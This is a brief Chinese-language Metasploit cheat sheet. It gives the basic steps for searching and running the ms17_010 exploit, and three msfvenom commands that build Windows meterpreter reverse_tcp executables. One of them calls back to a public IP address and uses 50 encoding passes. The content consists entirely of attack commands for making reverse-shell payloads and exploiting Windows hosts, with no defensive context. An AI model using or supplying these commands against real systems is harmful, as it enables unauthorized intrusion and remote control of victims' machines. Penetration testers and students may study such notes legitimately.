# Metasploit

基本使用

```
search ms17_010
use exploit/xxx
info
set LOHST 192.168.32.217
run
```

msfvenom 使用

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.32.215 LPORT=5555 -f exe /位置/test.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.184.129 LPORT=5555 -f exe -o /var/test.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=45.77.249.160 LPORT=6666 -f exe -i 50 -o c:/xx.exe
```